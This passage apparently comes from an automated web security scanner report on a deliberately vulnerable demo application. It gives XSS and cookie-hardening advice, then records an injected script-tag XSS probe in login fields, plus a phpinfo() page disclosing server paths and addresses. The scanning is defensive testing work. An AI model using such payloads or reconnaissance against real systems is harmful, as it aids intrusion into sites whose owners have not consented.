              <code>  $input = htmlentities($input, ENT_QUOTES, 'UTF-8');
</code>
              <br />
              <br />
              <text>In addition, in order to avoid UTF-7 variants of Cross-site Scripting, you should explicitly define the Content-Type header of the response, for example:</text>
              <br />
              <br />
              <code>  &lt;?php
  header('Content-Type: text/html; charset=UTF-8');
  ?&gt;
</code>
              <br />
              <br />
              <text>[8-2] Secure the cookie</text>
              <br />
              <br />
              <text>When storing sensitive data in a cookie and transporting it over SSL, make sure that you first set the secure flag of the cookie in the HTTP response. This will instruct the browser to only use that cookie over SSL connections.</text>
              <br />
              <br />
              <text>You can use the following code example, for securing the cookie:</text>
              <br />
              <br />
              <code>  &lt;$php
      $value = "some_value";
      $time = time()+3600;
      $path = "/application/";
      $domain = ".example.com";
      $secure = 1;
      setcookie("CookieName", $value, $time, $path, $domain, $secure, TRUE);
  ?&gt;
</code>
              <br />
              <br />
              <text>In addition, we recommend that you use the HttpOnly flag. When the HttpOnly flag is set to TRUE the cookie will be made accessible only through the HTTP protocol. This means that the cookie won't be accessible by scripting languages, such as JavaScript. This setting can effectly help to reduce identity theft through XSS attacks (although it is not supported by all browsers).</text>
              <br />
              <br />
              <text>The HttpOnly flag was Added in PHP 5.2.0.</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <br />
              <text>[1] Mitigating Cross-site Scripting With HTTP-only Cookies: </text>
              <link target="http://msdn2.microsoft.com/en-us/library/ms533046.aspx">http://msdn2.microsoft.com/en-us/library/ms533046.aspx</link>
              <br />
              <text>[2] PHP Security Consortium: </text>
              <link target="http://phpsec.org/">http://phpsec.org/</link>
              <br />
              <text>[3] PHP &amp; Web Application Security Blog (Chris Shiflett): </text>
              <link target="http://shiflett.org/">http://shiflett.org/</link>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Informational</Severity>
        <EntityType>Parameter</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
    </IssueTypes>
    <Issues>
      <Issue IssueTypeID="attCrossSiteScripting" Noise="False">
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Entity />
        <Variant ID="136">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=%3E%22%27%3E%3Cscript%3Ealert%28696%29%3C%2Fscript%3E,parameter: cookie password= -&gt; password=%3E%22%27%3E%3Cscript%3Ealert%28696%29%3C%2Fscript%3E</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1104" Length="10" String="alert(696)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 125
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=%3E%22%27%3E%3Cscript%3Ealert%28696%29%3C%2Fscript%3E&amp;password=%3E%22%27%3E%3Cscript%3Ealert%28696%29%3C%2Fscript%3E
HTTP/1.1 200 OK
Content-Length: 594
Date: Mon, 14 Jul 2014 14:45:07 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either &gt;"'&gt;&lt;script&gt;alert(696)&lt;/script&gt; or &gt;"'&gt;&lt;script&gt;alert(696)&lt;/script&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="ApplicationTestScriptDetected" Noise="False">
        <Url>http://tftarget/</Url>
        <Entity />
        <Variant ID="1144">
          <Comments />
          <Difference>path: cookie /demo/ -&gt; /test.php</Difference>
          <Reasoning>AppScan requested a file which is probably not a legitimate part of the application. The response status was 200 OK. This indicates that the test  succeeded in retrieving the content of the requested file.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="145" Length="3" String="200" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /test.php HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 76677
Date: Mon, 14 Jul 2014 14:45:17 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;
&lt;html&gt;&lt;head&gt;
&lt;style type="text/css"&gt;
body {background-color: #ffffff; color: #000000;}
body, td, th, h1, h2 {font-family: sans-serif;}
pre {margin: 0px; font-family: monospace;}
a:link {color: #000099; text-decoration: none; background-color: #ffffff;}
a:hover {text-decoration: underline;}
table {border-collapse: collapse;}
.center {text-align: center;}
.center table { margin-left: auto; margin-right: auto; text-align: left;}
.center th { text-align: center !important; }
td, th { border: 1px solid #000000; font-size: 75%; vertical-align: baseline;}
h1 {font-size: 150%;}
h2 {font-size: 125%;}
.p {text-align: left;}
.e {background-color: #ccccff; font-weight: bold; color: #000000;}
.h {background-color: #9999cc; font-weight: bold; color: #000000;}
.v {background-color: #cccccc; color: #000000;}
.vr {background-color: #cccccc; text-align: right; color: #000000;}
img {float: right; border: 0px;}
hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}
&lt;/style&gt;
&lt;title&gt;phpinfo()&lt;/title&gt;&lt;meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /&gt;&lt;/head&gt;
&lt;body&gt;&lt;div class="center"&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;td&gt;
&lt;a href="http://www.php.net/"&gt;&lt;img border="0" src="/test.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42" alt="PHP Logo" /&gt;&lt;/a&gt;&lt;h1 class="p"&gt;PHP Version 5.3.6&lt;/h1&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;System &lt;/td&gt;&lt;td class="v"&gt;Windows NT TFTARGET 6.1 build 7600 (Unknow Windows version Enterprise Edition) i586 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Build Date &lt;/td&gt;&lt;td class="v"&gt;Mar 17 2011 10:34:15 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Compiler &lt;/td&gt;&lt;td class="v"&gt;MSVC9 (Visual C++ 2008) &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Architecture &lt;/td&gt;&lt;td class="v"&gt;x86 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Configure Command &lt;/td&gt;&lt;td class="v"&gt;cscript /nologo configure.js  &amp;quot;--enable-snapshot-build&amp;quot; &amp;quot;--disable-isapi&amp;quot; &amp;quot;--enable-debug-pack&amp;quot; &amp;quot;--disable-isapi&amp;quot; &amp;quot;--without-mssql&amp;quot; &amp;quot;--without-pdo-mssql&amp;quot; &amp;quot;--without-pi3web&amp;quot; &amp;quot;--with-pdo-oci=D:\php-sdk\oracle\instantclient10\sdk,shared&amp;quot; &amp;quot;--with-oci8=D:\php-sdk\oracle\instantclient10\sdk,shared&amp;quot; &amp;quot;--with-oci8-11g=D:\php-sdk\oracle\instantclient11\sdk,shared&amp;quot; &amp;quot;--enable-object-out-dir=../obj/&amp;quot; &amp;quot;--enable-com-dotnet&amp;quot; &amp;quot;--with-mcrypt=static&amp;quot; &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Server API &lt;/td&gt;&lt;td class="v"&gt;Apache 2.0 Handler &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Virtual Directory Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Configuration File (php.ini) Path &lt;/td&gt;&lt;td class="v"&gt;C:\Windows &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Loaded Configuration File &lt;/td&gt;&lt;td class="v"&gt;C:\PHP\php.ini &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Scan this dir for additional .ini files &lt;/td&gt;&lt;td class="v"&gt;(none) &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Additional .ini files parsed &lt;/td&gt;&lt;td class="v"&gt;(none) &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;PHP API &lt;/td&gt;&lt;td class="v"&gt;20090626 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;PHP Extension &lt;/td&gt;&lt;td class="v"&gt;20090626 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Zend Extension &lt;/td&gt;&lt;td class="v"&gt;220090626 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Zend Extension Build &lt;/td&gt;&lt;td class="v"&gt;API220090626,TS,VC9 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;PHP Extension Build &lt;/td&gt;&lt;td class="v"&gt;API20090626,TS,VC9 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Debug Build &lt;/td&gt;&lt;td class="v"&gt;no &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Thread Safety &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Zend Memory Manager &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Zend Multibyte Support &lt;/td&gt;&lt;td class="v"&gt;disabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;IPv6 Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Registered PHP Streams &lt;/td&gt;&lt;td class="v"&gt;php, file, glob, data, http, ftp, zip, compress.zlib, compress.bzip2, https, ftps, phar   &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Registered Stream Socket Transports &lt;/td&gt;&lt;td class="v"&gt;tcp, udp, ssl, sslv3, sslv2, tls &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Registered Stream Filters &lt;/td&gt;&lt;td class="v"&gt;convert.iconv.*, mcrypt.*, mdecrypt.*, string.rot13, string.toupper, string.tolower, string.strip_tags, convert.*, consumed, dechunk, zlib.*, bzip2.* &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="v"&gt;&lt;td&gt;
&lt;a href="http://www.zend.com/"&gt;&lt;img border="0" src="/test.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42" alt="Zend logo" /&gt;&lt;/a&gt;
This program makes use of the Zend Scripting Language Engine:&lt;br /&gt;Zend&amp;nbsp;Engine&amp;nbsp;v2.3.0,&amp;nbsp;Copyright&amp;nbsp;(c)&amp;nbsp;1998-2011&amp;nbsp;Zend&amp;nbsp;Technologies&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;hr /&gt;
&lt;h1&gt;&lt;a href="/test.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000"&gt;PHP Credits&lt;/a&gt;&lt;/h1&gt;
&lt;hr /&gt;
&lt;h1&gt;Configuration&lt;/h1&gt;
&lt;h2&gt;&lt;a name="module_apache2handler"&gt;apache2handler&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;Apache Version &lt;/td&gt;&lt;td class="v"&gt;Apache/2.2.19 (Win32) PHP/5.3.6 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Apache API Version &lt;/td&gt;&lt;td class="v"&gt;20051115 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Server Administrator &lt;/td&gt;&lt;td class="v"&gt;admin@denimgroup.com &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Hostname:Port &lt;/td&gt;&lt;td class="v"&gt;192.168.1.30:0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Max Requests &lt;/td&gt;&lt;td class="v"&gt;Per Child: 0 - Keep Alive: on - Max Per Connection: 100 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Timeouts &lt;/td&gt;&lt;td class="v"&gt;Connection: 300 - Keep-Alive: 5 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Virtual Server &lt;/td&gt;&lt;td class="v"&gt;No &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Server Root &lt;/td&gt;&lt;td class="v"&gt;C:/Program Files (x86)/Apache Software Foundation/Apache2.2 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Loaded Modules &lt;/td&gt;&lt;td class="v"&gt;core mod_win32 mpm_winnt http_core mod_so mod_actions mod_alias mod_asis mod_auth_basic mod_authn_default mod_authn_file mod_authz_default mod_authz_groupfile mod_authz_host mod_authz_user mod_autoindex mod_cgi mod_dir mod_env mod_include mod_isapi mod_log_config mod_mime mod_negotiation mod_setenvif mod_php5 &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;engine&lt;/td&gt;&lt;td class="v"&gt;1&lt;/td&gt;&lt;td class="v"&gt;1&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;last_modified&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;xbithack&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;Apache Environment&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Variable&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;HTTP_ACCEPT &lt;/td&gt;&lt;td class="v"&gt;*/* &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;HTTP_ACCEPT_LANGUAGE &lt;/td&gt;&lt;td class="v"&gt;en-US &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;HTTP_USER_AGENT &lt;/td&gt;&lt;td class="v"&gt;Mozilla/4.0 (compatible; MSIE 6.0; Win32) &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;HTTP_HOST &lt;/td&gt;&lt;td class="v"&gt;tftarget &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;PATH &lt;/td&gt;&lt;td class="v"&gt;C:\Program Files (x86)\PHP\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;c:\Program Files (x86)\Microsoft SQL Server\100\Tools\Binn\;c:\Program Files (x86)\Microsoft SQL Server\100\DTS\Binn\;c:\Program Files (x86)\Microsoft SQL Server\100\Tools\Binn\VSShell\Common7\IDE\;C:\Program Files (x86)\MySQL\MySQL Server 5.5\bin;C:\Program Files (x86)\OpenLDAP\kfw\Binary;C:\Program Files (x86)\MIT\Kerberos\bin;C:\PHP\;C:\Program Files (x86)\OpenSSH\bin &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SystemRoot &lt;/td&gt;&lt;td class="v"&gt;C:\Windows &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;COMSPEC &lt;/td&gt;&lt;td class="v"&gt;C:\Windows\system32\cmd.exe &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;PATHEXT &lt;/td&gt;&lt;td class="v"&gt;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;WINDIR &lt;/td&gt;&lt;td class="v"&gt;C:\Windows &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SERVER_SIGNATURE &lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt; &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SERVER_SOFTWARE &lt;/td&gt;&lt;td class="v"&gt;Apache/2.2.19 (Win32) PHP/5.3.6 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SERVER_NAME &lt;/td&gt;&lt;td class="v"&gt;tftarget &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SERVER_ADDR &lt;/td&gt;&lt;td class="v"&gt;10.2.10.111 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SERVER_PORT &lt;/td&gt;&lt;td class="v"&gt;80 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;REMOTE_ADDR &lt;/td&gt;&lt;td class="v"&gt;10.2.1.48 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;DOCUMENT_ROOT &lt;/td&gt;&lt;td class="v"&gt;C:/Program Files (x86)/Apache Software Foundation/Apache2.2/htdocs &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SERVER_ADMIN &lt;/td&gt;&lt;td class="v"&gt;admin@denimgroup.com &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SCRIPT_FILENAME &lt;/td&gt;&lt;td class="v"&gt;C:/Program Files (x86)/Apache Software Foundation/Apache2.2/htdocs/test.php &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;REMOTE_PORT &lt;/td&gt;&lt;td class="v"&gt;3029 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;GATEWAY_INTERFACE &lt;/td&gt;&lt;td class="v"&gt;CGI/1.1 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SERVER_PROTOCOL &lt;/td&gt;&lt;td class="v"&gt;HTTP/1.0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;REQUEST_METHOD &lt;/td&gt;&lt;td class="v"&gt;GET &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;QUERY_STRING &lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt; &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;REQUEST_URI &lt;/td&gt;&lt;td class="v"&gt;/test.php &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SCRIPT_NAME &lt;/td&gt;&lt;td class="v"&gt;/test.php &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;HTTP Headers Information&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th colspan="2"&gt;HTTP Request Headers&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;HTTP Request &lt;/td&gt;&lt;td class="v"&gt;GET /test.php HTTP/1.0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Accept &lt;/td&gt;&lt;td class="v"&gt;*/* &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Accept-Language &lt;/td&gt;&lt;td class="v"&gt;en-US &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;User-Agent &lt;/td&gt;&lt;td class="v"&gt;Mozilla/4.0 (compatible; MSIE 6.0; Win32) &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Host &lt;/td&gt;&lt;td class="v"&gt;tftarget &lt;/td&gt;&lt;/tr&gt;
&lt;tr class="h"&gt;&lt;th colspan="2"&gt;HTTP Response Headers&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;X-Powered-By &lt;/td&gt;&lt;td class="v"&gt;PHP/5.3.6 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Connection &lt;/td&gt;&lt;td class="v"&gt;close &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Content-Type &lt;/td&gt;&lt;td class="v"&gt;text/html &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_bcmath"&gt;bcmath&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;BCMath support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;bcmath.scale&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_bz2"&gt;bz2&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;BZip2 Support &lt;/td&gt;&lt;td class="v"&gt;Enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Stream Wrapper support &lt;/td&gt;&lt;td class="v"&gt;compress.bzip2:// &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Stream Filter support &lt;/td&gt;&lt;td class="v"&gt;bzip2.decompress, bzip2.compress &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;BZip2 Version &lt;/td&gt;&lt;td class="v"&gt;1.0.6, 6-Sept-2010 &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_calendar"&gt;calendar&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;Calendar support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_com_dotnet"&gt;com_dotnet&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;COM support&lt;/th&gt;&lt;th&gt;enabled&lt;/th&gt;&lt;/tr&gt;
&lt;tr class="h"&gt;&lt;th&gt;DCOM support&lt;/th&gt;&lt;th&gt;disabled&lt;/th&gt;&lt;/tr&gt;
&lt;tr class="h"&gt;&lt;th&gt;.Net support&lt;/th&gt;&lt;th&gt;enabled&lt;/th&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com.allow_dcom&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com.autoregister_casesensitive&lt;/td&gt;&lt;td class="v"&gt;1&lt;/td&gt;&lt;td class="v"&gt;1&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com.autoregister_typelib&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com.autoregister_verbose&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com.code_page&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
